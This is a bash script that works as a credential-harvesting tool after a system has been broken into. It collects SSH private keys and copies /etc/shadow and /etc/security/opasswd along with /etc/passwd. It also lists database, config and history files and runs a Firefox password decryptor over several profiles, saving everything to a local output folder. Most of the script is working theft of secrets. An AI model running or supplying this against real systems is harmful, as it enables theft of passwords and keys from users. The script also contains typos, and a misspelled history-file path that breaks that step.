#!/bin/bash

mkdir out && mkdir out/ssh && mkdir out/pass && mkdir out/files
echo '[+] Indentifying .ssh and private keys:'
locate .ssh > out/ssh/locate
echo '[*] Searching for private keys...'
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null > out/ssh/private
echo "[*] Searching for ssh-rsa's..."
grep -rnw "ssh-rsa" /home/* 2>/dev/null > out/ssh/ssh-rsa

echo '[+] Looking for access to /etc/passwd'
cat /etc/passwd 2>/dev/null > out/pass/passwd

echo '[+] Loocking for access to /etc/shadow'
cat /etc/shadow 2>/dev/null > out/pass/shadow

echo '[+] Loocking for access to /etc/security/opasswd'
cat /etc/security/opasswd 2>/dev/null > out/pass/opasswd

echo '[+] Searching for .sql and .db files...'
(for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done) > out/files/dbs

echo '[+] Searching for .conf .cnf .conf files...'
(for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done) > out/files/config_files

echo '[+] Searching for script files...'
(for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done) > out/files/scripts

echo "[+] Loocking for access to .bash_history's"
locate .bnash_history > out/files/bash_history

echo "[+] Loocking for access to .zsh_history's"
locate .zsh_history > out/files/zsh_history

echo '[+] Loocking for firefox hashes passwords...'
echo '[+] Loocking for firefox hashes passwords...'
python3 firefox_decrypt/firefox_decrypt.py > out/files/firefox_pass

read -p "[?] Repeat firefox leak with other profile? (y/n): " confirm 
iteration=0

while [ $confirm == y ]
do
iteration=$((iteration+1))
python3 firefox_decrypt/firefox_decrypt.py > out/files/firefox_pass_$iteration
read -p "[?] Repeat firefox leak with other profile? (y/n): " confirm
done
